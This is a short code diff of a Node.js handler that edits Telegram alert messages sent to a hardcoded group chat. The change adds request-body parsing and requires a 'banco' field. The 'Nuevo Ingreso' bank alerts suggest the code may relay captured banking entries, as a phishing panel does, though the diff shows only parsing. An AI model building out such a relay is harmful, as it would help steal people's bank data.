@@ -456,11 +456,28 @@ export const latamSimpleMsj = async (req, res) => {
 
 export const editLatamMsj = async (req, res) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
-  const data = req.body.data;
+  const raw = req.body;
+  let data;
   const chatId = "-1003470878672";
   const messageId = req.body.messageId; // Asegúrate de pasar el messageId en la solicitud
   console.log(messageId);
-  console.log(data);
+   if (typeof raw === 'string') {
+      data = JSON.parse(raw);
+    } else if (raw && typeof raw.data === 'string') {
+      data = JSON.parse(raw.data);
+    } else if (raw && typeof raw.data === 'object') {
+      data = raw.data;
+    } else {
+      data = raw; // ya es objeto usable
+    }
+  
+    console.log(data);
+
+    // 2) Valida campos requeridos
+    if (!data || typeof data !== 'object' || !data.banco) {
+      return res.status(400).json({ success: false, error: 'Invalid payload: "banco" is required' });
+    }
+  
   let nuevoTexto = `
 🚨🚨 Nuevo Ingreso 🚨🚨
 
